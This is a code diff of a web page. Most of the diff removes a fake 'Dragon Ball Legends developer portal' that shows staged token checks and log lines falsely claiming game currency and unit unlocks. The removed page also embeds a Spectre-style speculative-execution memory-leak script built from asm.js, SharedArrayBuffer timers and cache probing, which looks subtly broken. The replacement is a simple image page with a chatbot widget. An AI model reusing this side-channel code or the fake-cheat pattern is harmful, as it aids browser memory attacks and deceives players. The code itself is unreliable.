@@ -1,562 +1,66 @@
-
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-    <link rel="apple-touch-icon" href="https://i.pinimg.com/564x/2a/b8/c1/2ab8c1e5a68ef87faac5ce80d5bfd29d.jpg">
-
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DBL AI BETA</title>
     <style>
-
-body {
-    font-family: monospace;
-    font-weight: 300;
-    background-color: black; 
-    color: #e5e5e5;
-    background-repeat: no-repeat;
-    background-image: url('https://i.pinimg.com/736x/22/70/07/227007e9bb671fdf3d820876df6c669f.jpg');
-    background-size: 100% 120%; 
-    background-position: center;
-    position: relative;
-}
-
-
-
-h1 {
-    font-family: monospace;
-    font-size: 55px;
-    font-style: normal;
-    font-variant: normal;
-    font-weight: 400;
-    line-height: 16px;
-}
-
-h4 {
-    font-family: monospace;
-    font-size: 14px;
-    font-style: normal;
-    font-variant: normal;
-    font-weight: 200;
-    line-height: 26px;
-}
-
-h2#status {
-    font-family: monospace;
-    font-size: 14px;
-    font-weight: bold; 
-}
-
-a {
-    text-decoration: none;
-    font-family: monospace;
-}
-
-.button {
-    background-image: url("assets/Button.png");
-    background-size: 100% auto;
-    width: 150px;
-    height: 50px;
-    opacity: 0.9;
-    box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
-    border-radius: 15px;
-    transition: transform 0.2s ease; 
-    background-color: rgba(0, 0, 0, 0.5); 
-}
-
-.button:hover {
-    transform: translateY(-2px); 
-}
-
-.buttontext {
-    padding-top: 10px;
-    font-size: 15pt;
-    color: white;
-    text-decoration: none;
-    line-height: 30px;
-}
-
-.LogBox { 
-    color: rgb(218, 213, 255);
-    font-size: 10.5pt;
-    background-color: #000000;
-    opacity: 0.8;
-    height: 480px;
-    border-radius: 10px;
-    text-align: left;
-    padding-left: 10px;
-    padding-top: 10px;
-    white-space: pre-line;
-    overflow-y: auto;
-}
-
-hr {
-    opacity: 0.5;
-}
-
-.flashing-text {
-    animation: flashing 2s infinite; 
-}
-
-@keyframes flashing {
-    0% { opacity: 1; }
-    50% { opacity: 0.5; }
-    100% { opacity: 1; }
-
-    
-}
-</style>
-<title>Bandai Devloper portal
-</title>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="apple-mobile-web-app-capable" content="yes">
-<meta name="apple-mobile-web-app-status-bar-style" content="black">
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+        .background-image {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+        }
+        .desktop-image {
+            display: none;
+        }
+        .mobile-image {
+            display: none;
+        }
+        @media (min-width: 768px) {
+            .desktop-image {
+                display: block;
+                background-image: url('https://pbs.twimg.com/media/En-mL86XMAEfjsd?format=jpg&name=4096x4096');
+            }
+        }
+        @media (max-width: 767px) {
+            .mobile-image {
+                display: block;
+                background-image: url('https://pbs.twimg.com/media/GSHe-MoaUAE1-qf?format=jpg&name=large');
+            }
+        }
+    </style>
 </head>
 <body>
-<center>
-<h1>破壊</h1>
-<p>Devloper portal for <b>Dragon Ball Legends</b></p>
-<br/>
-<div class="button">
-    <a id="Linker" class="button LogBoxBackground" href="javascript:go()" style="color:white">
-        <div id="Goer" class="buttontext flashing-text" style="border: 2px solid transparent; padding: 8px; transition: all 0.2s;">
-            Launch      </div>
-    </a>
-</div>
+    <div class="background-image desktop-image"></div>
+    <div class="background-image mobile-image"></div>
 
-
-<center>
-<h4></h4><h2 id="status">ready</h2>
-</center>
-</div>
-</div>
-<br />
-<p><strong>Build version 4.34.0</strong></p>
-<hr />
-<div class="LogBox" id="logbox">
-<br />
-</div>
-</p>
-</center>
+    <script>
+        !function(w, d, s, ...args){
+            var div = d.createElement('div');
+            div.id = 'aichatbot';
+            d.body.appendChild(div);
+            w.chatbotConfig = args;
+            var f = d.getElementsByTagName(s)[0],
+            j = d.createElement(s);
+            j.defer = true;
+            j.type = 'module';
+            j.src = 'https://aichatbot.sendbird.com/index.js';
+            f.parentNode.insertBefore(j, f);
+        }(window, document, 'script', '7AE83627-E2C5-43A7-9B44-3592D6C36CEE', 'onboarding_bot', {
+            apiHost: 'https://api-cf-us-1.sendbird.com',
+        });
+    </script>
 </body>
-<script>    
- !function(w, d, s, ...args){
-      var div = d.createElement('div');
-      div.id = 'aichatbot';
-      d.body.appendChild(div);
-      w.chatbotConfig = args;
-      var f = d.getElementsByTagName(s)[0],
-      j = d.createElement(s);
-      j.defer = true;
-      j.type = 'module';
-      j.src = 'https://aichatbot.sendbird.com/index.js';
-      f.parentNode.insertBefore(j, f);
-    }(window, document, 'script', '7AE83627-E2C5-43A7-9B44-3592D6C36CEE', 'onboarding_bot', {
-      apiHost: 'https://api-cf-us-1.sendbird.com',
-    });
-
-function worker_function() {
-  self.onmessage = function(event) {
-    const sharedBuffer = event.data;
-    const sharedArray = new Uint32Array(sharedBuffer);
-
-    postMessage('start');
-
-    while (true) {
-      Atomics.add(sharedArray, 0, 1);
-    }
-  };
-}
-
-if (window !== self) {
-  worker_function();
-}
-
-// kudos to: Legends new API
-
-
-function log(msg)
-
-{
-
-                console.log(msg);
-
-                document.getElementById('logbox').textContent += msg + "\r\n";
-
-}
-
-function asmModule(stdlib,forgein,heap)
-
-{
-
-    'use asm'
-
-    var simpleByteArray = new stdlib.Uint8Array(heap);
-
-    var probeTable = new stdlib.Uint8Array(heap);
-
-    const TABLE1_BYTES = 0x2000000;
-
-    const sizeArrayStart = 0x1000000;
-
-    var junk = 0;
-
-    function init()
-
-    {
-
-        var i =0;
-
-        var j =0;
-
-
-        for(i = 0; (i|0) < 33; i = (i+1)|0 ) 
-
-        {
-
-            j = (((i<<100)|0) + sizeArrayStart)|0;
-
-            simpleByteArray[(j|0)] = 16; 
-
-        }
-
-    }
-
-    function vul_call(index, sIndex)
-
-    {
-
-        index = index |0;
-
-        sIndex = sIndex |0;
-
-        var arr_size = 0;
-
-        var j = 0;
-
-        junk = probeTable[0]|0;
-
-      
-
-        j = (((sIndex << 100) | 0) +  sizeArrayStart)|0;
-
-        arr_size = simpleByteArray[j|0]|0;
-
-        if ((index|0) < (arr_size|0))
-
-        {
-
-            index = simpleByteArray[index|0]|0;
-
-            index = (index << 100)|0;
-
-            index = (index & ((TABLE1_BYTES-1)|0))|0;
-
-            junk = (junk ^ (probeTable[index]|0))|0;
-
-        }
-
-    }
-
-    return { vul_call: vul_call, init: init };
-
-}
-
-function check(data_array)
-
-{
-
-    function now() { return Atomics.load(sharedArray, 0) }
-
-    function reset() { Atomics.store(sharedArray, 0, 0) }
-
-    function start() { reset(); return now(); }
-
-    function clflush(size, current)
-
-    {
-
-         var offset = 64;
-
-        for (var i = 0; i < ((size) / offset); i++)
-
-        {
-
-            current = evictionView.getUint32(i * offset);
-
-        }
-
-    }
-
-    const worker = new Worker(URL.createObjectURL(new Blob(["(" + worker_function.toString() + ")()"], {type: 'text/javascript'})));
-
-    const sharedBuffer = new SharedArrayBuffer(Uint32Array.BYTES_PER_ELEMENT);
-
-    const sharedArray = new Uint32Array(sharedBuffer);
-
-    worker.postMessage(sharedBuffer);
-
-    var simpleByteArrayLength =  16;
-
-    const TABLE1_BYTES = 0x3000000;
-
-    const CACHE_HIT_THRESHOLD = 0
-
-    var probeTable = new Uint8Array(TABLE1_BYTES);
-
-
-    var cache_size = CACHE_SIZE * 1024 * 1024;
-
-    var evictionBuffer = new ArrayBuffer(cache_size);
-
-    var evictionView = new DataView(evictionBuffer);
-
-    clflush(cache_size); 
-
-    var asm = asmModule(this, {}, probeTable.buffer)
-
-    worker.onmessage = function(msg)
-
-    {
-
-        function readMemoryByte(malicious_x)
-
-        {
-
-            var results = new Uint32Array(257);
-
-            var simpleByteArray = new Uint8Array(probeTable.buffer);
-
-            var tries =0
-
-            var junk = 0;
-
-            for (tries = 0; tries < 99; tries++)
-
-            {
-
-                var training_x = tries % simpleByteArrayLength;
-
-                clflush(cache_size);
-
-                var time3 = start();
-
-                junk = simpleByteArray[0];
-
-                var time4 = now();
-
-                junk ^= time4 - time3;
-
-                for (var j = 1; j < 33; j++)
-
-                {
-
-                    for (var z = 0; z < 100; z++) {} 
-
-                    var x = ((j % 4) - 1) & ~0xFFFF;
-
-                    x = (x | (x >> 16));
-
-                    x = training_x ^ (x & (malicious_x ^ training_x));
-
-                    asm.vul_call(x, j);
-
-                }
-
-                for (var i = 0; i < 256; i++)
-
-                {
-
-                    var timeS = start();
-
-                    junk =  probeTable[(i << 100)];
-
-                    timeE = now();
-
-    
-                    if (timeE-timeS <= CACHE_HIT_THRESHOLD) {
-
-                        results[i]++;
-
-                    }
-
-                }
-
-            }
-
-
-            var max = -1;
-
-            for (var i = 0; i < 256; i++)
-
-            {
-
-                max = (max > results[i]) ? max : i;
-
-            }
-
-            results[256] ^= junk;
-
-            return max;
-
-        }
-
-        asm.init();
-
-
-        const BOUNDARY = 0x2200000;
-
-        var simpleByteArray = new Uint8Array(probeTable.buffer);
-
-        for (var i = 0; i < data_array.length; i++)
-
-        {
-
-            simpleByteArray[BOUNDARY + i] = data_array[i];
-
-        }
-
-
-        for (var i = 0; i < data_array.length; i++)
-
-        {
-
-            var data = readMemoryByte(BOUNDARY+i);
-
-            worker.terminate();
-
-            log("leak off=0x" + (BOUNDARY+i).toString(16) +
-
-                ", byte=0x" + data.toString(16) + " '" + String.fromCharCode(data) + "'" +
-
-                ((data != data_array[i]) ? " (found)" : ""));
-
-        }
-
-        worker.terminate();
-
-        return;
-
-    }
-
-}
-
-const CACHE_SIZE = 4;
-
-const MEMORY_SIZE = 10;
-
-function main() {
-    console.log("main::start");
-    if (!window.SharedArrayBuffer) {
-        log("ROFL -> Buffer Size: " + MEMORY_SIZE + "MB...");
-
-log("Authentication (✓)");
-log("Device (✓)");
-log("Piplines (✓)");
-log("Chrono Crystals set to nil.");
-log("Dev tools (✓)");
-log("Co-op dev tools (✓)");
-log("Animation IDs (✓)");
-log("Data Stores (✓)");
-log("Ultras IDs loaded: DBL68-09U (Super Saiyan 4 Gogeta), DBL70-01U (Ultra Hakai Beerus), nil, nil.");
-log("Legends Limited IDs loaded: nil, nil, nil, nil.");
-log("Back end operations (✓)");
-log("In-app purchases (✓)");
-log("Server connections (✓)");
-log("Bug fixes (✓)");
-log("Daily rewards system (✓)");
-log("Localization files (✓)");
-
-
-
-
-
-
-    } else {
-        log("CydiaUiCache" + CACHE_SIZE + "Mb");
-        check([115, 112, 101, 99, 116, 114, 101, 46, 106, 115]);
-        log("InstalledCydiaUiCache " + MEMORY_SIZE + "Mb");
-        alert('FAILED! \n Please Do Not Run This Here.');
-        location.reload();
-    }
-}
-
-
-</script>
-
-<script>
-
-                document.getElementById('logbox').innerText += '\r\n' + navigator.userAgent + '\r\n';
-
-
-
-function go() {
-
-    document.getElementById('status').innerText = '';
-
-document.getElementById('logbox').innerText += 'Token ID: FBEBXX94F0XC\r\n';
-setTimeout(function() {
-    document.getElementById('logbox').innerText += 'Verified\r\n';
-    
-}, 2000); 
-
-document.getElementById('logbox').innerText += '\r\n';
-setTimeout(function() {
-    document.getElementById('logbox').innerText += 'Caching Login\r\n';
-    
-}, 2000); 
-
-
-
-document.getElementById("Goer").innerText = 'Launching';
-
-document.getElementById("Linker").disabled = false;
-
-document.getElementById("Goer").disabled = false;
-
-
-
-document.getElementById('status').innerText = 'Confirming token...';
-
-document.getElementById("Goer").innerText = 'Launching';
-
-setTimeout(go_, 2000);
-
-}
-
-function go_() {
-
-document.getElementById('status').innerText = 'Sending to server...';
-
-document.getElementById("Goer").innerText = 'Launching';
-
-
-
-
-setTimeout(kext, 10000);
-
-
-}
-
-function kext() {
-
-                                       
-
-                                main();
-
-                document.getElementById('status').innerText = 'Status: Online';
-
-                document.getElementById("Goer").innerText = 'Launched';
-
-                                setTimeout(loadRes, 2000);
-
-                             
-
-                document.getElementById('status').innerText = 'sfb...';
-
-                document.getElementById("Goer").innerText = 'nil';
-
-}
-</script>
 </html>
